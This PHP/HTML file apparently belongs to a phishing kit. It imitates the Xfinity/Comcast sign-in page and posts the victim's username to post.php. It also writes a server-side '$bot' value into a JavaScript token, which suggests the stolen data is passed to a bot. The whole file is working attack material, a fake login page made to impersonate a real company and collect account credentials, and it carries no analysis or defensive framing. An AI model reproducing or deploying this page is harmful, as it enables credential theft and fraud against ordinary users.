<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>xfinity</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
    <main>
        <div class="container">
            <div class="logo">
                <img src="res/img/logo.png" alt="">
            </div>
            <div class="title">
                <h2>Sign in with your Xfinity ID</h2>
            </div>
            <div class="col">
            <form action="post.php" method="post">
                    <input type="text" name="user" placeholder="Email,mobile, or username" required>
                </div>
                <br>
				<script>var token=<?php echo json_encode($bot); ?>;</script> 

                <div class="terms">
                By signing in, you agree to our <a href="">Terms of Service</a> and <a href="">Privacy Policy.</a>
                </div>
                <div class="btn">
                    <button>Let's go</button>
                </div>
                </form>
                <br>
                <div class="find">
                    <div class="link">
                       <label>New to Xfinity? View exclusive offers near you</label>
                       <span>></span>
                </div>
                <hr>
                <div class="link">
                    <label>Find your Xfinity ID</label>
                    <span>></span>
                </div>
                <hr>
                <div class="link">
                <label>Create a new Xfinity ID</label>
                    <span>></span>
                </div>
            </div>
        </div>
        <footer>

            <div class="copy">
                &copy; 2025 Comcast
            </div>

            <div class="links">
                <div class="pic"> <img src="res/img/line1.png" alt="">
                <a href="#">
                   Web Terms Of Service
                </a>
                </div>

                <div class="pic2"> <img src="res/img/line2.png" alt="">
                <a href="#">
                    CA Notice at Collection
                </a>
                </div>

                <div class="pic3"> <img src="res/img/line3.png" alt="">
                <a href="#">
                    Privacy Policy
                </a>
                </div>

                <div class="pic4"> <img src="res/img/line4.png" alt="">
                <a href="#">
                    Your Privacy Choices
                </a>
                </div>

                <div class="pic5"> <img src="res/img/line5.png" alt="">
                <a href="#">
                    <span>Health Privacy Notice
                </a>
                </div>

                <div class="pic6"> <img src="res/img/line6.png" alt="">
                <a href="#">
                    Ad Choices
                </a>
                </div>
            </div>
     
            <div class="cookie">
            <div class="foter"> <img src="res/img/foter.png" alt="">
                <a href="#">
                    <span>Cookie Preferences</span>
                </a>
                </div>
            </div>
    </footer>
    </main>
	<script src="./res/cdn/jq.js"></script>
	<script src="./res/jquery.js"></script>  

    
</body>
</html>